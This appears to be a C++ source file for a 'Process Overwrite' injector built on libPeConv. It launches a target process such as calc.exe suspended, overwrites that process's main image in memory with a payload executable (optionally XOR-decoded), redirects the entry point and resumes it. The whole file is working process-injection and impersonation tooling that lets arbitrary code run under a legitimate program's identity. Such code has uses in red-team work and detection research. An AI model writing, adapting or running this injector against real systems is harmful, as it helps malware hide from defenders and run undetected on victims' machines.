#include <Windows.h>
#include <iostream>

#include <peconv.h> // include libPeConv header

#include "process_manip.h"
#include "overwrite.h"

bool get_calc_path(LPSTR lpwOutPath, DWORD szOutPath, bool isPayl32bit)
{
    if (isPayl32bit) {
#ifdef _WIN64
        ExpandEnvironmentStringsA("%SystemRoot%\\SysWoW64\\calc.exe", lpwOutPath, szOutPath);
#else
        ExpandEnvironmentStringsA("%SystemRoot%\\system32\\calc.exe", lpwOutPath, szOutPath);
#endif
}
    else {
        ExpandEnvironmentStringsA("%SystemRoot%\\system32\\calc.exe", lpwOutPath, szOutPath);
    }
    return true;
}

bool process_overwrite(PROCESS_INFORMATION &pi, BYTE* payloadBuf, DWORD payloadSize, DWORD targetImgSize)
{
    if (targetImgSize < payloadSize) {
        std::cerr << "Target too small\n";
        return false;
    }

    bool isPayl32b = !peconv::is64bit(payloadBuf);

    ULONGLONG remoteBase = get_remote_img_base(pi, isPayl32b);
    std::cout << "Main module at: " << std::hex << (ULONG_PTR)remoteBase << "\n";

    bool hasReloc = peconv::has_relocations(payloadBuf);
    if (!hasReloc) {
        ULONGLONG paylBase = peconv::get_image_base(payloadBuf);
        if (remoteBase != paylBase) {
            std::cerr << "[!] Payload has no relocations, and cannot be injected at desired base!\n";
            return false;
        }
    }

    bool is_overwritten = false;
    //rewrite the payload to a new buffer, with padding, to avoid the leftovers from the orignal process...
    {
        BYTE* padded_payl = (BYTE*)calloc(targetImgSize, 1);
        memcpy(padded_payl, payloadBuf, payloadSize);

        // write the padded buffer into the process...
        is_overwritten = overwrite_mapping(pi.hProcess, (HMODULE)remoteBase, padded_payl, targetImgSize);
        free(padded_payl);
    }
    if (!is_overwritten) {
        std::cerr << "Failed to overwrite\n";
        return false;
    }

    if (!redirect_to_payload(payloadBuf, remoteBase, pi, isPayl32b)) {
        std::cerr << "Failed to update EP\n";
        return false;
    }
    std::cout << "Resuming, PID " << std::dec << pi.dwProcessId << std::endl;
    //Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return true;
}

void decode_payload(BYTE* buffer, size_t size, BYTE* key, size_t key_size)
{
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_size];
    }
}

int main(int argc, char* argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 4) {
        std::cout << "Process Overwrite (";
        if (is32bit) std::cout << "32bit";
        else std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload_path> [*target_path] [*payload_key]\n"
            "\t*payload_path - the PE to be run. It may be XOR obfuscated (then, reqires supplying payload_key).\n"
            "\t*target_path - the process to impresonate. If not supplied, calc.exe will be used.\n"
            "\t*payload_key - if the payload is XOR-obfuscated, supply the key" << std::endl;
        if (argc < 2) {
            system("pause");
            return 0;
        }
        std::cout << "---\n" << std::endl;
    }
    bool useDefaultTarget = true;
    char defaultTarget[MAX_PATH] = { 0 };
    char* targetPath = defaultTarget;
    if (argc >= 3) {
        targetPath = argv[2];
        useDefaultTarget = false;
    }
    char* payloadPath = argv[1];
    size_t bufsize = 0;
    // load the payload:
    BYTE* buffer = peconv::load_file(payloadPath, bufsize);
    if (!buffer) {
        std::cerr << "Cannot read file:" << payloadPath << std::endl;
        return -1;
    }
    if (argc >= 4) {
        std::string key = argv[3];
        if (key.length()) {
            decode_payload(buffer, bufsize, (BYTE*)key.c_str(), key.length());
            std::cout << "[+] Decoded with key: " << key << std::endl;
        }
    }
    size_t payloadSize = 0;
    BYTE* payloadBuf = peconv::load_pe_module(buffer, bufsize, payloadSize, false, false);
    if (!payloadBuf) {
        std::cerr << "Not a valid PE file!" << std::endl;
        return -1;
    }

    size_t paylImgSize = peconv::get_image_size(payloadBuf);
    bool isPayl32b = !peconv::is64bit(payloadBuf);
    if (is32bit && !isPayl32b) {
        std::cout << "[ERROR] The injector (32 bit) is not compatibile with the payload (64 bit)\n";
        return 1;
    }

    // if no target supplied, get the default one:
    if (useDefaultTarget) {
        get_calc_path(defaultTarget, MAX_PATH, isPayl32b);
    }
    std::cout << "[+] Target: " << targetPath << std::endl;
    bool isTarget32b = true;
    size_t targetImgSize = 0;
    // fetch target info to check the compatibility:
    {
        size_t targetSize = 0;
        BYTE* targetBuf = peconv::load_pe_module(targetPath, targetSize, false, false);
        if (!targetBuf) {
            std::cout << "Cannot read target\n";
            return 0;
        }
        isTarget32b = !peconv::is64bit(targetBuf);
        targetImgSize = peconv::get_image_size(targetBuf);
        peconv::free_pe_buffer(targetBuf);
    }
    if (paylImgSize > targetImgSize) {
        std::cerr << "[!!] The target: "  << std::hex << targetImgSize << " is too small to fit the payload: " << paylImgSize << "\n";
        return false;
    }
    if (isTarget32b != isPayl32b) {
        std::cerr << "[!!] The target has a different bitness than the payload!\n";
        return false;
    }

    // create the process for the injection:
    PROCESS_INFORMATION pi = { 0 };
    char* cmdline = NULL;

    if (!create_suspended_process(targetPath, cmdline, true, pi)) {
        std::cerr << "Creating process failed!\n";
#ifdef _DEBUG
        std::cout << "[WARNING] The program was build in a Debug mode. This causes changing process mitigations to fail! Please build in Release mode." << std::endl;
#endif //_DEBUG
        return false;
    }
    // do the overwrite:
    std::cout << "[+] Created Process, PID: " << std::dec << pi.dwProcessId << "\n";
    const bool is_ok = process_overwrite(pi, payloadBuf, (DWORD)payloadSize, (DWORD)targetImgSize);

    peconv::free_pe_buffer(payloadBuf);

    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    }
    else {
        terminate_process(pi.dwProcessId);
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
